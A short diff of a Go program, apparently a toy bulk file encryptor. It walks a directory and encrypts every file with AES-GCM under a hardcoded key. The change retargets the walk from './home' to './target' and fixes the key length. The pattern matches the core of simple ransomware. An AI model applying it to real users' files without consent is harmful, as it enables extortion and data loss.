@@ -13,7 +13,7 @@ import (
 // Function to encrypt files
 func encryptFiles(gcm cipher.AEAD) {
 	// Loop through target files and encrypt them
-	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
+	filepath.Walk("./target", func(path string, info os.FileInfo, err error) error {
 		// Skip if it's a directory
 		if !info.IsDir() {
 			// Encrypt the file
@@ -45,7 +45,7 @@ func encryptFiles(gcm cipher.AEAD) {
 // Function to decrypt files
 func decryptFiles(gcm cipher.AEAD) {
 	// Loop through target encrypted files and decrypt them
-	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
+	filepath.Walk("./target", func(path string, info os.FileInfo, err error) error {
 		// Skip if it's a directory or not an encrypted file
 		if !info.IsDir() && path[len(path)-4:] == ".enc" {
 			// Decrypt the file
@@ -76,7 +76,7 @@ func decryptFiles(gcm cipher.AEAD) {
 
 func main() {
 	// Define the decryption key as a variable
-	var decryptionKey string = "123" // You can change this value as needed
+	var decryptionKey string = "1234567890123456" // You can change this value as needed
 
 	// Initialize AES in GCM mode with the hardcoded key
 	key := []byte(decryptionKey)
